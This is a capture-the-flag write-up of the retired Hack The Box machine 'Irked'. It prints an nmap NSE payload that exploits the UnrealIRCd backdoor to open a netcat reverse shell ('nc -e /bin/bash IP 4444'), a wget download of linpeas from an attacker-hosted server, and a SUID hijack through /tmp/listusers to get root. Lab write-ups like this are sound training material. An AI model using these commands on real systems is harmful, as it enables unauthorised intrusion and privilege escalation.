---
title: Irked Hackthebox Writeup
date: 2021-01-04 23:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,irc,UnrealIRCd,nmap,SUID]     # TAG names should always be lowercase
image: /assets/img/irked-hackthebox/irked-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Irked:~$


Column | Details
------------ | -------------
Name | Irked
IP | 10.10.10.117
Points | 20
Os | Linux
Difficult | Easy
Creator | [MrAgent](https://www.hackthebox.eu/home/users/profile/624)
Out on | 17th November 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* Exploiting `UnrealIRCd` version of `irc` to get a shell.
* Using `LinEnum.sh` to find out something **phishy** and get Root.

# Starting:~$

## Nmap

From a `full port` scan I got to know the open ports, so I ran `-sV` for the service versions.
**Nmap Command** : `nmap -p 22,80,111,6697,8067,53090,65534 -sV -Pn 10.10.10.117`

___
![](/assets/img/irked-hackthebox/nmapp-scan-1.png)

Let's check `Port 80` first.

___
![](/assets/img/irked-hackthebox/port-80-2.png)

I used `dirbuster` for finding the hidden directories, with *directory-list-2.3-medium.txt* as the **wordlist**. 

___
![](/assets/img/irked-hakthebox/dirbuster-3.png)

I found `/manual/` directory using dirbuster.

___
![](/assets/img/irked-hackthebox/dirbuster-screenshot-4.png)

Accessing that directory, I got an `Apache Documentation` page.

___
![](/assets/img/irked-hackthebox/manual-webpage-5.png)

I checked the webiste but it was a waste of time, so I directly jumped to `6697,8067,65534` ports as they showed the service `irc`, which is also visible on port 80.

I googled **6697 enumeration** and found [RCE using Nmap]( https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html)

After trying the script on all 3 ports, it worked on `8067` port.

**Payload**: *nmap -d -p8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -e /bin/bash IP 4444' 10.10.10.117*

and listening on Port `4444` using nc. We got a shell.

___
![](/assets/img/irked-hackthebox/got-shell-using-nmap-11.png)

**Stabling the shell**: *python -c 'import pty; pty.spawn("/bin/bash")'*

Checking for `user.txt`.

___
![](/assets/img/irked-hackthebox/locating-user-flag-12.png)

We do not have access to view `user.txt`.

___
![](/assets/img/irked-hackthebox/permission-denied-flag-13.png)

Let's `Escalate Privileges` by running [**linpeas.sh**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Downloading it to the vulnerable machine.

___
![](/assets/img/irked-hackthebox/linpeas-downloading-14.png)

*Hosting Command for linpeas.sh*: Python3 -m http.server 8081

*Downloading Command for linpeas.sh*: wget http://10.10.X.X:8081/linpeas.sh

Running `linpeas.sh` after giving it executing permissions by *chmod +x linpeas.sh*, I found something interesting.

___
![](/assets/img/irked-hackthebox/suid-15.png)

I used *strings* command to check the content of `viewuser`, and found this:

___
![](/assets/img/irked-hackthebox/lisyusers-16.png)

This shows that `listusers` in `/tmp` directory is being executed with root permissions and *listusers* doesn't exist there, So I created a file with the name called `listusers` consisting of malicious payload and gave it executing permissions by *chmod +x listusers*.

Then further executed `viewuser` to get `Root`.

___
![](/assets/img/irked-hackthebox/got-root-117.png)